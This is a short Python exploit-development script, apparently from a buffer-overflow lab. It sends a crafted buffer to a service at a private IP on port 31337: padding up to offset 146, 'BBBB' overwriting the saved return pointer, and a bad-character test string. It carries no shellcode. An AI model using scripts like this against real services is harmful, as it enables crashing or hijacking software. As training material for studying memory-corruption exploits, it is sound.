import socket

RHOST = "10.92.92.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

bad_char_test = "" # start with an empty string
# bad_chars = [0x00, 0x0A] # we've reasoned that these are definitely bad
bad_chars = [0x00, 0x0A]
# generate the string
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
    if i not in bad_chars: # skip the badchars
        bad_char_test += chr(i) # append each non-badchar char to the string

# open a file for writing ("w") the string as binary ("b") data
with open("bad_char_test_2.bin", "wb") as f:
    f.write(bad_char_test.encode())

buffer_total_len = 1024
offset_srp = 146

buffer = ""
buffer += "A" * (offset_srp - len(buffer)) # padding
buffer += "BBBB" # SRP overwrite
buffer += bad_char_test # ESP points here
buffer += "D" * (buffer_total_len - len(buffer)) # trailing padding
buffer += "\n"

s.send(buffer.encode())